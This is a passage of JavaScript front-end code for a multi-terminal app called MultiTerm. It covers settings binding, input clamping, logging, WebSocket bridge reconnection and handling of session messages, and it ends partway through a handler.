const palette = { open: false, index: 0, items: [] };
const fullscreenFocus = {
  active: false,
  desired: false,
  queue: Promise.resolve(),
  scheduled: 0,
  snapshot: null
};
let draggedHeaderAction = null;
let pendingHeaderActionMove = null;
let terminalNotificationFlyoutId = null;
let terminalNotificationFlyoutAnchor = null;

const COPILOT_CWD_HISTORY_STORAGE_KEY = "multiterm.copilotCwdHistory";
const COPILOT_CWD_HISTORY_LIMIT = 10;

function normalizeCopilotCwdEntry(value) {
  const entry = String(value ?? "")
    .replace(/\s*[\u0000-\u001f\u007f-\u009f\u2028\u2029]+\s*/g, " ")
    .trim();
  return entry && entry.length <= 8192 ? entry : "";
}

function normalizeCopilotCwdHistory(value) {
  if (!Array.isArray(value)) return [];
  const seen = new Set();
  const history = [];
  for (const candidate of value) {
    const entry = normalizeCopilotCwdEntry(candidate);
    const key = entry.toLocaleLowerCase();
    if (!entry || seen.has(key)) continue;
    seen.add(key);
    history.push(entry);
    if (history.length === COPILOT_CWD_HISTORY_LIMIT) break;
  }
  return history;
}

function loadCopilotCwdHistory() {
  try {
    return normalizeCopilotCwdHistory(JSON.parse(localStorage.getItem(COPILOT_CWD_HISTORY_STORAGE_KEY) || "[]"));
  } catch {
    return [];
  }
}

const initialSettings = loadSettings();

const state = {
  activeId: null,
  activePageId: null,
  analytics: loadTerminalAnalytics(),
  analyticsRuntime: { focusStartedAt: 0, focusedTerminalId: null, saveTimer: 0, ticker: 0, ticksSinceSave: 0 },
  automations: loadAutomationStore(initialSettings.automationHistoryLimit),
  automationRuntime: { lastMessageRefresh: 0, lastTickAt: Date.now(), ticking: false, timer: 0 },
  automationStudio: { editingId: null, returnFocus: null, view: "schedules" },
  bridgeClosingDown: false,
  closeDisposition: "",
  closeRequestSource: "window",
  copilotCwdHistory: loadCopilotCwdHistory(),
  pendingPageClose: null,
  prepareEditor: { closeTimer: 0, lineNumbersFrame: 0, mode: "copy", resizeObserver: null, returnFocus: null, sourceTerminalId: null, validating: false, wordWrap: true },
  findAll: { active: false, order: [], ti: 0, li: -1, query: "", filter: false },
  appElevated: false,
  broadcastScope: "all",
  manualLayouts: loadManualLayouts(),
  mem: { open: false, timer: null, requested: false, stats: null, unsupported: false, unsupportedReason: null },
  pages: loadPages(),
  primaryId: null,
  reconnectAttempts: 0,
  reconnectTimer: null,
  settings: initialSettings,
  snap: null,
  socket: null,
  socketReady: false,
  statistics: { terminalId: null, loading: false, requestGeneration: 0, returnFocus: null },
  terminalArtifacts: loadTerminalArtifacts(),
  terminalArtifactsHub: { returnFocus: null, savedTimer: 0 },
  terminalMessages: new Map(),
  terminalMessagesHub: { returnFocus: null },
  terminalLinks: loadTerminalLinks(),
  terminalConnections: { actionHideTimer: 0, animationFrame: 0, animationUntil: 0, frame: 0, linkMoved: false, linkPointerId: null, linkPoint: null, linkSourceId: null, linkTargetId: null, mutationObserver: null, resizeObserver: null },
  terminalPages: loadTerminalPages(),
  terminalSearch: "",
  terminals: new Map(),
  update: { release: null, downloading: false, checking: false, timer: null, scheduleGeneration: 0 },
  workspaces: loadWorkspaces(),
  zoomedId: null
};
state.activePageId = loadActivePageId(state.pages);

/* ---------------- Logging & tail console --------------- */

const LOG_LEVEL_RANK = { debug: 0, info: 1, warn: 2, error: 3 };

const logStore = {
  entries: [],
  max: 2000,
  seq: 0,
  minLevel: "info",
  autoscroll: true,
  unseenError: false
};

function logEvent(level, source, message, detail) {
  const entry = {
    id: ++logStore.seq,
    time: Date.now(),
    level: level in LOG_LEVEL_RANK ? level : "info",
    source: source || "app",
    message: typeof message === "string" ? message : String(message)
  };
  if (detail !== undefined && detail !== null) {
    entry.detail = detail;
  }

  logStore.entries.push(entry);
  if (logStore.entries.length > logStore.max) {
    logStore.entries.splice(0, logStore.entries.length - logStore.max);
  }

  mirrorLogToConsole(entry);
  appendLogRow(entry);

  if (entry.level === "error" && elements.logPanel && elements.logPanel.hidden) {
    logStore.unseenError = true;
    if (elements.logToggleDot) elements.logToggleDot.hidden = false;
  }
  return entry;
}

function mirrorLogToConsole(entry) {
  const label = `[MT:${entry.source}]`;
  const args = entry.detail !== undefined ? [label, entry.message, entry.detail] : [label, entry.message];
  if (entry.level === "error") console.error(...args);
  else if (entry.level === "warn") console.warn(...args);
  else if (entry.level === "debug") console.debug(...args);
  else console.info(...args);
}

const log = {
  debug: (source, message, detail) => logEvent("debug", source, message, detail),
  info: (source, message, detail) => logEvent("info", source, message, detail),
  warn: (source, message, detail) => logEvent("warn", source, message, detail),
  error: (source, message, detail) => logEvent("error", source, message, detail)
};

window.addEventListener("error", (event) => {
  log.error("app", `Uncaught error: ${event.message}`, { file: event.filename, line: event.lineno, col: event.colno });
});

window.addEventListener("unhandledrejection", (event) => {
  const reason = event.reason instanceof Error ? event.reason.message : String(event.reason);
  log.error("app", `Unhandled promise rejection: ${reason}`);
});

window.addEventListener("DOMContentLoaded", () => {
  log.info("app", `MultiTerm ${APP_VERSION} starting`);
  initializeSettingsPanel();
  bindControls();
  bindHeaderActionCustomization();
  bindTerminalNotificationFlyout();
  applyVersion();
  applySettings();
  enhanceComboboxes();
  refreshWorkspaceSelect();
  bindPalette();
  bindPager();
  bindQuickSwitch();
  renderPager();
  bindContextMenu();
  bindRightClickWarning();
  bindCloseConfirm();
  bindPageCloseConfirm();
  bindUpdateConsent();
  bindUpdateDialog();
  bindStatisticsDialog();
  bindTerminalAnalytics();
  bindPrepareEditor();
  bindTerminalArtifactsHub();
  bindTerminalMessages();
  bindAutomationStudio();
  bindMemStatus();
  bindWorkspaceBackgroundZoom();
  bindGlobalShortcuts();
  bindFullscreenEvents();
  bindFindAll();
  window.addEventListener("resize", noteResizeGesture);
  document.addEventListener("visibilitychange", flushAllTerminalOutput);
  systemThemeQuery.addEventListener("change", () => {
    if (state.settings.appTheme === "system") applyAppTheme();
  });
  connectBridge();
  refreshIcons();
  refreshElevationStatus();
  // Perf (Electron guideline #4): defer low-priority, non-visual startup work to
  // an idle period so the first terminal connects and becomes interactive sooner.
  // Ripples are cosmetic; the log/diagnostics panel is opened on demand — neither
  // is needed for first paint or early input.
  whenIdle(() => {
    attachRipples();
    bindLogConsole();
    initializeAutomaticUpdateChecks();
  });
  log.debug("app", "UI initialized", { theme: state.settings.appTheme, layout: state.settings.layout });
});

window.addEventListener("beforeunload", () => {
  shutdownTerminalAnalytics();
  stopAutomationRunner();
  state.bridgeClosingDown = true;
  stopAutomaticUpdateChecks();
  window.clearTimeout(state.reconnectTimer);
  state.reconnectTimer = null;
  saveSettings();
  saveManualLayouts();
  saveSessionSnapshot();
  if (state.closeDisposition !== "quitKeep" && !state.settings.keepSessionsOnClose) {
    recoverAllTerminalArtifacts("application quit");
    sendBridge({ type: "killAll" });
  }
});

function bindControls() {
  elements.layoutMode.value = state.settings.layout;
  elements.pagerPlacement.value = normalizedPagerPlacement();
  elements.minWidth.value = state.settings.minWidth;
  elements.columnCount.value = state.settings.columns;
  elements.rowCount.value = state.settings.rows;
  elements.paneHeight.value = state.settings.paneHeight;
  elements.focusWidth.value = state.settings.focusWidth;
  elements.paneGap.value = state.settings.gap;
  elements.workspaceZoom.value = state.settings.workspaceZoom;
  elements.statusWorkspaceZoom.value = state.settings.workspaceZoom;
  elements.fontSize.value = state.settings.fontSize;
  elements.titleFontScale.value = state.settings.titleFontScale;
  elements.terminalTheme.value = state.settings.theme;
  elements.appTheme.value = state.settings.appTheme;
  elements.fontFamily.value = state.settings.fontFamily;
  elements.headerActionDragScope.value = normalizeHeaderActionDragScope(state.settings.headerActionDragScope);
  elements.cursorStyle.value = state.settings.cursorStyle;
  elements.cursorBlink.checked = state.settings.cursorBlink;
  elements.compactChrome.checked = state.settings.compactChrome;
  elements.syncInput.checked = state.settings.syncInput;
  elements.ctrlVPaste.checked = state.settings.ctrlVPaste;
  elements.cleanCopilotClipboard.checked = state.settings.cleanCopilotClipboard;
  state.settings.copilotImportContextKb = clampCopilotImportContextKb(
    state.settings.copilotImportContextKb,
    elements.copilotImportContextKb
  );
  elements.keepSessionsOnClose.checked = state.settings.keepSessionsOnClose;
  elements.restoreSession.checked = state.settings.restoreSession;
  elements.bellNotify.checked = state.settings.bellNotify;
  elements.copyOnSelect.checked = state.settings.copyOnSelect;
  elements.highlightInputPrompts.checked = state.settings.highlightInputPrompts;
  elements.rightClickAction.value = state.settings.rightClickAction;
  elements.scrollbackLines.value = state.settings.scrollback;
  elements.scrollbackInfinite.checked = state.settings.scrollbackInfinite;
  elements.scrollOnOutput.checked = state.settings.scrollOnOutput;
  elements.outputCoalesceMs.value = state.settings.outputCoalesceMs;
  elements.outputBacklogKb.value = state.settings.outputBacklogKb;
  elements.pageCloseAction.value = normalizePageCloseAction(state.settings.pageCloseAction);
  elements.terminalMessageMaxKb.value = state.settings.terminalMessageMaxKb;
  elements.terminalInboxCapacity.value = state.settings.terminalInboxCapacity;
  state.settings.maxInstallerSizeMb = normalizeInstallerSizeMb(
    state.settings.maxInstallerSizeMb,
    elements.maxInstallerSizeMb
  );
  elements.notifyActivity.checked = state.settings.notifyActivity;
  elements.notifySilence.checked = state.settings.notifySilence;
  elements.silenceSeconds.value = state.settings.silenceSeconds;
  elements.startupCommand.value = state.settings.startupCommand;
  syncAutomaticUpdateControls();

  elements.addTerminal.addEventListener("click", () => addTerminal({ reveal: true, runStartup: true }));
  elements.fullscreenAddTerminal.addEventListener("click", () => {
    const terminal = addTerminal({ reveal: true, runStartup: true });
    terminal.term.focus();
  });
  elements.attachTmux.addEventListener("click", openTmuxAttach);
  elements.copilotSessionsToggle.addEventListener("click", () => openCopilotResume(null, { newTerminal: true }));
  elements.tmuxAttachClose.addEventListener("click", closeTmuxAttach);
  elements.tmuxAttachRefresh.addEventListener("click", refreshTmuxSessions);
  elements.tmuxAttachOverlay.addEventListener("pointerdown", (event) => {
    if (event.target === elements.tmuxAttachOverlay) closeTmuxAttach();
  });
  elements.tmuxAttachOverlay.addEventListener("keydown", (event) => {
    if (event.key === "Escape") {
      event.preventDefault();
      closeTmuxAttach();
    }
  });
  elements.copilotResumeClose.addEventListener("click", closeCopilotResume);
  elements.copilotResumeRefresh.addEventListener("click", refreshCopilotSessions);
  elements.copilotResumeSearch.addEventListener("input", renderCopilotSessions);
  elements.copilotResumeSearch.addEventListener("keydown", (event) => {
    if (event.key === "ArrowDown") {
      event.preventDefault();
      elements.copilotResumeList.querySelector(".copilot-session-card")?.focus();
    } else if (event.key === "Enter") {
      const first = elements.copilotResumeList.querySelector(".copilot-session-card");
      if (first) {
        event.preventDefault();
        first.click();
      }
    }
  });
  elements.copilotResumeOverlay.addEventListener("pointerdown", (event) => {
    if (event.target === elements.copilotResumeOverlay) closeCopilotResume();
  });
  elements.copilotResumeOverlay.addEventListener("keydown", (event) => {
    if (event.key === "Escape") {
      event.preventDefault();
      closeCopilotResume();
    }
  });
  elements.closeAllTerminals.addEventListener("click", closeAllTerminals);
  elements.statusZoomOut.addEventListener("click", () => fontZoom(-1));
  elements.statusZoomIn.addEventListener("click", () => fontZoom(1));
  elements.statusWorkspaceZoom.addEventListener("focus", clearTerminalFocus);
  elements.statusWorkspaceZoom.addEventListener("input", () => {
    clearTerminalFocus();
    setWorkspaceZoom(elements.statusWorkspaceZoom.value, { announce: true });
  });
  elements.fitAll.addEventListener("click", fitAllTerminals);
  elements.resetLayout.addEventListener("click", resetLayout);
  elements.commandPalette.addEventListener("click", openPalette);
  elements.terminalArtifactsToggle.addEventListener("click", () => openTerminalArtifacts(state.activeId));
  elements.themeToggle.addEventListener("click", toggleAppTheme);
  elements.helpToggle.addEventListener("click", openShortcuts);
  elements.helpDocToggle.addEventListener("click", openHelp);
  elements.helpDocClose.addEventListener("click", closeHelp);
  elements.helpOverlay.addEventListener("pointerdown", (event) => {
    if (event.target === elements.helpOverlay) closeHelp();
  });
  elements.aboutToggle.addEventListener("click", openAbout);
  elements.aboutClose.addEventListener("click", closeAbout);
  elements.aboutCheckUpdates?.addEventListener("click", () => {
    closeAbout();
    checkForUpdates({ manual: true });
  });
  elements.aboutOverlay.addEventListener("pointerdown", (event) => {
    if (event.target === elements.aboutOverlay) closeAbout();
  });
  elements.shortcutsClose.addEventListener("click", closeShortcuts);
  elements.shortcutsOverlay.addEventListener("pointerdown", (event) => {
    if (event.target === elements.shortcutsOverlay) closeShortcuts();
  });
  elements.broadcastToggle.addEventListener("click", () => toggleBroadcast());
  elements.broadcastClose.addEventListener("click", () => toggleBroadcast(false));
  elements.broadcastSend.addEventListener("click", sendBroadcast);
  elements.broadcastScope.addEventListener("click", toggleBroadcastScope);
  elements.broadcastEnter.addEventListener("click", () => {
    state.settings.broadcastSendEnter = !state.settings.broadcastSendEnter;
    updateBroadcastEnterToggle();
    saveSettings();
  });
  updateBroadcastEnterToggle();
  elements.broadcastInput.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
      event.preventDefault();
      sendBroadcast();
    } else if (event.key === "Escape") {
      event.preventDefault();
      toggleBroadcast(false);
    }
  });
  elements.workspaceSave.addEventListener("click", () => saveWorkspace(elements.workspaceName.value));
  elements.workspaceRestore.addEventListener("click", () => restoreWorkspace(elements.workspaceSelect.value));
  elements.workspaceDelete.addEventListener("click", () => deleteWorkspace(elements.workspaceSelect.value));
  elements.terminalSearchInput.addEventListener("input", () => {
    state.terminalSearch = elements.terminalSearchInput.value;
    applyTerminalSearch();
  });
  elements.terminalSearchInput.addEventListener("keydown", (event) => {
    // Same navigation contract as the find bars: Enter walks the matches the
    // filter left on screen, Escape drops the filter and restores every pane.
    if (event.key === "Enter") {
      event.preventDefault();
      findAllNav(event.shiftKey ? -1 : 1);
    } else if (event.key === "Escape") {
      event.preventDefault();
      clearTerminalSearch();
    }
  });
  elements.toggleHeader.addEventListener("click", () => toggleChrome("headerHidden"));
  elements.toggleSidecar.addEventListener("click", () => toggleChrome("sidecarHidden"));
  elements.toggleHeaderTop.addEventListener("click", () => toggleChrome("headerHidden"));
  elements.toggleSidecarTop.addEventListener("click", () => toggleChrome("sidecarHidden"));
  elements.shellSelect.addEventListener("change", updateStatusBar);
  elements.pagerPlacement.addEventListener("change", () => setPagerPlacement(elements.pagerPlacement.value));

  bindSetting(elements.layoutMode, "layout", "change", (value) => value);
  bindSetting(elements.minWidth, "minWidth", "input", Number);
  bindSetting(elements.columnCount, "columns", "input", Number);
  bindSetting(elements.rowCount, "rows", "input", Number);
  bindSetting(elements.paneHeight, "paneHeight", "input", Number);
  bindSetting(elements.focusWidth, "focusWidth", "input", Number);
  bindSetting(elements.paneGap, "gap", "input", Number);
  elements.workspaceZoom.addEventListener("input", () => {
    setWorkspaceZoom(elements.workspaceZoom.value, { announce: true });
  });
  bindSetting(elements.fontSize, "fontSize", "input", Number);
  bindSetting(elements.titleFontScale, "titleFontScale", "input", normalizeTitleFontScale);
  bindSetting(elements.terminalTheme, "theme", "change", (value) => value);
  bindSetting(elements.appTheme, "appTheme", "change", (value) => value);
  bindSetting(elements.fontFamily, "fontFamily", "change", (value) => value);
  bindSetting(elements.headerActionDragScope, "headerActionDragScope", "change", normalizeHeaderActionDragScope);
  bindSetting(elements.cursorStyle, "cursorStyle", "change", (value) => value);
  bindSetting(elements.cursorBlink, "cursorBlink", "change", (_, element) => element.checked);
  bindSetting(elements.compactChrome, "compactChrome", "change", (_, element) => element.checked);
  bindSetting(elements.syncInput, "syncInput", "change", (_, element) => element.checked);
  bindSetting(elements.ctrlVPaste, "ctrlVPaste", "change", (_, element) => element.checked);
  bindSetting(elements.cleanCopilotClipboard, "cleanCopilotClipboard", "change", (_, element) => element.checked);
  bindSetting(elements.copilotImportContextKb, "copilotImportContextKb", "change", clampCopilotImportContextKb);
  bindSetting(elements.keepSessionsOnClose, "keepSessionsOnClose", "change", (_, element) => element.checked);
  bindSetting(elements.restoreSession, "restoreSession", "change", (_, element) => element.checked);
  bindSetting(elements.copyOnSelect, "copyOnSelect", "change", (_, element) => element.checked);
  bindSetting(elements.highlightInputPrompts, "highlightInputPrompts", "change", (_, element) => element.checked);
  bindSetting(elements.rightClickAction, "rightClickAction", "change", (value) => value);
  bindSetting(elements.scrollbackLines, "scrollback", "change", Number);
  bindSetting(elements.scrollbackInfinite, "scrollbackInfinite", "change", (_, element) => element.checked);
  bindSetting(elements.scrollOnOutput, "scrollOnOutput", "change", (_, element) => element.checked);
  bindSetting(elements.outputCoalesceMs, "outputCoalesceMs", "change", clampOutputCoalesceMs);
  bindSetting(elements.outputBacklogKb, "outputBacklogKb", "change", clampOutputBacklogKb);
  bindSetting(elements.pageCloseAction, "pageCloseAction", "change", normalizePageCloseAction);
  bindSetting(elements.terminalMessageMaxKb, "terminalMessageMaxKb", "change", clampTerminalMessageMaxKb);
  bindSetting(elements.terminalInboxCapacity, "terminalInboxCapacity", "change", clampTerminalInboxCapacity);
  bindSetting(elements.maxInstallerSizeMb, "maxInstallerSizeMb", "change", normalizeInstallerSizeMb);
  bindSetting(elements.notifyActivity, "notifyActivity", "change", (_, element) => element.checked);
  bindSetting(elements.notifySilence, "notifySilence", "change", (_, element) => element.checked);
  bindSetting(elements.silenceSeconds, "silenceSeconds", "change", Number);
  bindSetting(elements.startupCommand, "startupCommand", "change", (value) => value);

  elements.autoUpdateChecks.addEventListener("change", async () => {
    const enabled = elements.autoUpdateChecks.checked;
    try {
      await saveAndPersistAutomaticUpdatePreferences({
        configured: true,
        enabled,
        intervalHours: elements.updateCheckIntervalHours.value
      });
      syncAutomaticUpdateControls();
      if (enabled) {
        startAutomaticUpdateChecks({ checkNow: true });
        toast("Automatic update checks enabled.", "success", 2200);
      } else {
        stopAutomaticUpdateChecks();
        toast("Automatic update checks disabled.", "info", 2200);
      }
    } catch (error) {
      syncAutomaticUpdateControls();
      log.error("app", "Could not save update preferences", { error: String(error?.message || error) });
      toast("Update preference could not be saved.", "error", 4000);
    }
  });

  elements.updateCheckIntervalHours.addEventListener("change", async () => {
    try {
      const preferences = await saveAndPersistAutomaticUpdatePreferences({
        configured: true,
        intervalHours: elements.updateCheckIntervalHours.value
      });
      syncAutomaticUpdateControls();
      if (preferences.enabled) startAutomaticUpdateChecks({ checkNow: false });
    } catch (error) {
      syncAutomaticUpdateControls();
      log.error("app", "Could not save update preferences", { error: String(error?.message || error) });
      toast("Update preference could not be saved.", "error", 4000);
    }
  });

  for (const notifyToggle of [elements.notifyActivity, elements.notifySilence]) {
    notifyToggle.addEventListener("change", () => {
      if (notifyToggle.checked && "Notification" in window && Notification.permission === "default") {
        Notification.requestPermission();
      }
    });
  }

  elements.snippetAdd.addEventListener("click", () => addSnippet(elements.snippetName.value, elements.snippetCommand.value));
  elements.snippetCommand.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
      event.preventDefault();
      addSnippet(elements.snippetName.value, elements.snippetCommand.value);
    }
  });
  renderSnippets();

  elements.bellNotify.addEventListener("change", () => {
    state.settings.bellNotify = elements.bellNotify.checked;
    saveSettings();
    for (const terminal of state.terminals.values()) updateTerminalNotificationButton(terminal);
    if (!elements.terminalNotificationFlyout.hidden) renderTerminalNotificationFlyout();
    if (elements.bellNotify.checked && "Notification" in window && Notification.permission === "default") {
      Notification.requestPermission();
    }
  });
}

function toggleChrome(key) {
  state.settings[key] = !state.settings[key];
  applySettings();
  saveSettings();
}

function bindSetting(element, key, eventName, transform) {
  element.addEventListener(eventName, () => {
    state.settings[key] = transform(element.value, element);
    if (key === "layout") {
      clearSnapLayout(false);
    }
    if (key === "outputCoalesceMs") {
      sendBridgeConfig();
    } else if (key === "terminalMessageMaxKb" || key === "terminalInboxCapacity") {
      sendCommunicationConfig();
    }
    applySettings();
    saveSettings();
  });
}

// The bridge batches pty output on a timer whose length is a renderer setting, so
// it has to be pushed across on connect and on every change. An older bridge that
// does not understand "config" answers with an "error" frame, which is ignored.
function sendBridgeConfig() {
  sendBridge({ type: "config", outputCoalesceMs: Number(state.settings.outputCoalesceMs) });
}

function sendCommunicationConfig() {
  sendBridge({
    type: "communicationConfig",
    terminalInboxCapacity: Number(state.settings.terminalInboxCapacity),
    terminalMessageMaxKb: Number(state.settings.terminalMessageMaxKb)
  });
}

// Both performance limits are free-text number inputs, so a typo ("", "1e9",
// "-5") has to be folded back to something the bridge and the flush path can
// actually run with — and written back into the field so the value on screen is
// the value in force.
const OUTPUT_COALESCE_MS_BOUNDS = { min: 0, max: 100, fallback: 8 };
const OUTPUT_BACKLOG_KB_BOUNDS = { min: 64, max: 65536, fallback: 1024 };
const TERMINAL_MESSAGE_KB_BOUNDS = { min: 1, max: 1024, fallback: 64 };
const TERMINAL_INBOX_CAPACITY_BOUNDS = { min: 0, max: 2147483647, fallback: 500 };
const COPILOT_IMPORT_CONTEXT_KB_BOUNDS = { min: 8, max: 1024, fallback: 64 };
const INSTALLER_SIZE_MB_FALLBACK = 256;

function clampSettingNumber(value, element, bounds) {
  const requested = Number(value);
  const next = Number.isFinite(requested)
    ? Math.min(bounds.max, Math.max(bounds.min, Math.round(requested)))
    : bounds.fallback;
  element.value = next;
  return next;
}

function clampOutputCoalesceMs(value, element) {
  return clampSettingNumber(value, element, OUTPUT_COALESCE_MS_BOUNDS);
}

function clampOutputBacklogKb(value, element) {
  return clampSettingNumber(value, element, OUTPUT_BACKLOG_KB_BOUNDS);
}

function clampTerminalMessageMaxKb(value, element) {
  return clampSettingNumber(value, element, TERMINAL_MESSAGE_KB_BOUNDS);
}

function clampTerminalInboxCapacity(value, element) {
  return clampSettingNumber(value, element, TERMINAL_INBOX_CAPACITY_BOUNDS);
}

function clampCopilotImportContextKb(value, element) {
  return clampSettingNumber(value, element, COPILOT_IMPORT_CONTEXT_KB_BOUNDS);
}

function normalizeInstallerSizeMb(value, element) {
  const requested = Math.round(Number(value));
  const bytes = requested * 1024 * 1024;
  const next = Number.isFinite(requested) && requested > 0 && Number.isSafeInteger(bytes)
    ? requested
    : INSTALLER_SIZE_MB_FALLBACK;
  element.value = next;
  return next;
}

function connectBridge(locationProtocol = window.location.protocol) {
  if (locationProtocol === "file:") {
    setBridgeStatus("Open via bridge", "offline");
    log.warn("bridge", "Opened from file:// protocol; bridge unavailable");
    return;
  }

  window.clearTimeout(state.reconnectTimer);
  state.reconnectTimer = null;

  const protocol = locationProtocol === "https:" ? "wss:" : "ws:";
  const url = `${protocol}//${window.location.host}/ws`;
  const reconnecting = state.reconnectAttempts > 0;
  log.info("bridge", `${reconnecting ? "Reconnecting" : "Connecting"} to ${url}`);
  state.socket = new WebSocket(url);

  state.socket.addEventListener("open", () => {
    const wasReconnecting = state.reconnectAttempts > 0;
    state.socketReady = true;
    state.reconnectAttempts = 0;
    setBridgeStatus("Bridge connected", "online");
    log.info("bridge", wasReconnecting ? "WebSocket reconnected" : "WebSocket connected");
    sendBridge({ type: "rendererPresence" });
    sendBridgeConfig();
    sendCommunicationConfig();
    updateTerminalActions();
    for (const terminal of state.terminals.values()) {
      if (!terminal.remoteRequested && terminal.status !== "live") {
        requestSession(terminal);
      }
    }
  });

  state.socket.addEventListener("message", (event) => {
    let message;
    try {
      message = JSON.parse(event.data);
    } catch (err) {
      log.error("bridge", "Failed to parse bridge message", { error: String(err) });
      return;
    }
    handleBridgeMessage(message);
  });

  state.socket.addEventListener("close", () => {
    state.socketReady = false;
    for (const terminal of state.terminals.values()) {
      setTerminalStatus(terminal, "offline", "dead");
    }
    updateTerminalActions();
    scheduleReconnect();
  });

  state.socket.addEventListener("error", () => {
    state.socketReady = false;
    log.error("bridge", "WebSocket error");
    updateTerminalActions();
    // The browser fires "close" after "error"; reconnection is scheduled there.
  });
}

// Reconnect with capped exponential backoff so a dropped bridge recovers on its
// own instead of leaving the UI stuck offline until a manual page reload.
function scheduleReconnect() {
  if (state.bridgeClosingDown) return;
  if (state.reconnectTimer) return;

  const attempt = state.reconnectAttempts + 1;
  state.reconnectAttempts = attempt;
  const delay = Math.min(500 * 2 ** (attempt - 1), 3000);
  const seconds = Math.round(delay / 100) / 10;
  setBridgeStatus(`Bridge disconnected; reconnecting in ${seconds}s\u2026`, "offline");
  log.warn("bridge", `WebSocket disconnected; reconnect attempt ${attempt} in ${delay}ms`);
  state.reconnectTimer = window.setTimeout(() => {
    state.reconnectTimer = null;
    connectBridge();
  }, delay);
}

function handleBridgeMessage(message) {
  if (message.type === "title") {
    const terminal = state.terminals.get(message.id);
    if (terminal) commitTerminalTitle(terminal, message.title, false);
    return;
  }

  if (message.type === "terminalMessage") {
    ingestTerminalMessage(message.message);
    return;
  }

  if (message.type === "terminalMessages") {
    state.terminalMessages.clear();
    for (const entry of Array.isArray(message.messages) ? message.messages : []) {
      const normalized = normalizeIncomingTerminalMessage(entry);
      if (normalized) state.terminalMessages.set(normalized.id, normalized);
    }
    updateTerminalMessageIndicators();
    renderTerminalMessages();
    scheduleAllTerminalHandoffDeliveries();
    resolveBridgeRequest(message, message);
    return;
  }

  if (message.type === "terminalMessageChanged") {
    state.terminalMessages.delete(message.id);
    updateTerminalMessageIndicators();
    renderTerminalMessages();
    return;
  }

  if (message.type === "terminalMessagesExpired") {
    for (const id of Array.isArray(message.ids) ? message.ids : []) state.terminalMessages.delete(id);
    updateTerminalMessageIndicators();
    renderTerminalMessages();
    return;
  }

  if (message.type === "automationLease" || message.type === "messageSent" || message.type === "messageActionResult" || message.type === "messageError") {
    resolveBridgeRequest(message, message);
    return;
  }

  if (message.type === "communicationConfig") {
    log.debug("bridge", "Communication limits applied", {
      terminalInboxCapacity: message.terminalInboxCapacity,
      terminalMessageMaxKb: message.terminalMessageMaxKb
    });
    return;
  }

  if (message.type === "log") {
    ingestServerLog(message);
    return;
  }

  if (message.type === "scriptPicked") {
    resolveBridgeRequest(message, message.path || null);
    return;
  }

  if (message.type === "preparedSaved" || message.type === "prepareValidation") {
    resolveBridgeRequest(message, message);
    return;
  }

  if (message.type === "statistics") {
    resolveBridgeRequest(message, message);
    return;
  }

  if (message.type === "tmuxSessions") {
    resolveBridgeRequest(message, message);
    return;
  }

  if (message.type === "copilotSessions" || message.type === "copilotSessionContext") {
    resolveBridgeRequest(message, message);
    return;
  }

  if (message.type === "openFolder") {
    openFolderInNewTerminal(message.path);
    return;
  }

  if (message.type === "welcome") {
    log.info("bridge", "Received welcome", { cwd: message.cwd, sessions: Array.isArray(message.sessions) ? message.sessions.length : 0 });
    const known = new Set();
    const openFolders = Array.isArray(message.openFolders)
      ? message.openFolders.filter((folder) => typeof folder === "string" && folder.trim())
      : [];
    if (!elements.cwdInput.value) {
      elements.cwdInput.value = message.cwd || "";
    }

    if (Array.isArray(message.sessions) && message.sessions.length > 0) {
      const savedMetadata = new Map(
        loadSessionSnapshot()
          .filter((entry) => entry && entry.id)
          .map((entry) => [entry.id, entry])
      );
      batchTerminalWork(() => {
        for (const session of orderSessionsBySavedArrangement(message.sessions)) {
          known.add(session.id);
          const existing = state.terminals.get(session.id);
          if (existing) {
            reattachExistingSession(existing, session);
          } else {
            const savedMeta = savedMetadata.get(session.id) || null;
            const restored = addTerminal({ reattach: true, session, savedMeta });
            if (savedMeta?.minimized && restored) minimizeTerminal(restored.id);
          }
        }
      });
      // Any terminal we still hold that the bridge no longer lists must have
      // exited while we were disconnected.
      for (const terminal of state.terminals.values()) {
        if (terminal.remoteRequested && !known.has(terminal.id)) {
          markSessionLostWhileOffline(terminal);
        }
      }
    } else if (state.terminals.size === 0 && openFolders.length === 0) {
      const snapshot = state.settings.restoreSession ? loadSessionSnapshot() : null;
      if (snapshot && snapshot.length > 0) {
        batchTerminalWork(() => {
          for (const meta of snapshot) {
            const restored = addTerminal({
              title: meta.title,
              shell: meta.shell,
              cwd: meta.cwd,
              copilotCwd: meta.copilotCwd,
              color: meta.color,
              fontSizeOverride: meta.fontSizeOverride,
              headerActionOverrides: meta.headerActionOverrides,
              notificationOverrides: meta.notificationOverrides,
              tmux: meta.tmux
            });
            if (meta.minimized && restored) minimizeTerminal(restored.id);
          }
        });
      } else {
        addTerminal();
      }
    } else {
      // Reconnected but the bridge has no sessions: everything we held is gone.
      for (const terminal of state.terminals.values()) {
        if (terminal.remoteRequested) markSessionLostWhileOffline(terminal);
      }
    }

    for (const folder of openFolders) {
      openFolderInNewTerminal(folder);
    }
    recoverStaleTerminalArtifacts(known);
    pruneTerminalLinks();
    pruneTerminalAnalyticsRecords();
    requestTerminalMessages();

    return;
  }

  if (message.type === "created") {
    const terminal = state.terminals.get(message.id);
    if (!terminal) return;
    terminal.cwd = message.cwd;
    terminal.pid = message.pid;
    terminal.tmux = message.tmux || terminal.tmux;
    // The bridge stamps startedAt when it spawns the shell. Fall back to now if
    // an older bridge omits it — accurate to the round-trip, and better than
    // showing nothing.
    terminal.startedAt = message.startedAt || new Date().toISOString();
    ensureTerminalAnalyticsRecord(terminal).startedAt = terminal.startedAt;
    terminal.remoteRequested = true;
    terminal.status = "live";
    if (message.title !== terminal.titleInput.value) {
      sendBridge({ type: "title", id: terminal.id, title: terminal.titleInput.value });
    }
    syncTerminalArtifacts(terminal);
    if (message.elevated) {
      terminal.elevated = true;
      terminal.pane.classList.add("is-admin");
    }
    setTerminalStatus(terminal, `pid ${message.pid}`, "live");
    log.info("session", `Session live: ${terminal.titleInput.value}`, { id: message.id, pid: message.pid });
    updateTerminalSearchVisibility(terminal);
    scheduleFit(terminal);

    // The startup command runs unattended in every new shell, which makes it the
    // most valuable thing in settings for an attacker to tamper with; filter it
    // so it can never become more than the single line the user configured.
    const startup = terminal.runStartup ? safeTerminalCommand(state.settings.startupCommand) : null;
    if (startup) {
      terminal.runStartup = false;
      window.setTimeout(() => sendBridge({ type: "input", id: terminal.id, data: `${startup}\r` }), 250);
    }

    // A command queued at creation time (e.g. a broadcast with no terminals
    // open) runs once the shell is live, after any startup command.
    if (terminal.pendingCommand) {
      const pending = safeTerminalCommand(terminal.pendingCommand);
